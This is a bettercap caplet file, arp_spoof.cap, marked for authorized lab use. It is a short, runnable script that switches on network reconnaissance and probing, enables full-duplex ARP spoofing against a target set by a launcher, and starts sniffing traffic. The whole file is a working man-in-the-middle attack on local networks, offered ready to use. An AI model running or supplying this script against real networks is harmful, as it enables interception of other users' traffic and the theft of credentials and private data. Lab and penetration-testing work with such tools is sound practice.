# arp_spoof.cap
# Last Edited by Charles Duoto on November 17, 2026
# Basic full-duplex ARP spoof + sniff caplet for lab use.
# Authorized lab environments only.
#
# Usage:
#   bettercap -iface eth0 -caplet arp_spoof.cap
#   (or use the launcher script)

# Enable recon so we see hosts
net.recon on
net.probe on

# Full-duplex ARP spoof (both directions)
set arp.spoof.fullduplex true

# Target will be set by the launcher or manually
# set arp.spoof.targets 192.168.1.10

# Start the spoof
arp.spoof on

# Start sniffing
net.sniff on
